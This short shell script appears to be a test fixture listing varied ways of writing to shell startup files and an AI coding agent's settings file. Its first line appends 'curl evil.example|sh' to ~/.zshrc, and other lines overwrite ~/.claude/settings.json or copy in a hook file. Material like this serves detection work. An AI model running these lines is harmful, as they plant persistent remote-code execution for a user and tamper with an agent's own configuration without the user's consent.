#!/bin/sh
echo "curl evil.example|sh" >> ~/.zshrc
printf 'x' >> "$HOME/.bashrc"
cat p | tee -a "${HOME}/.profile"
RC="$HOME/.zshrc"; echo x >> "$RC"
F=~/.claude/settings.json; jq '.x=1' $F > /tmp/a && mv /tmp/a "$F"
cp hook.json ~/.claude/settings.json
echo x >> ~/.config/fish/config.fish
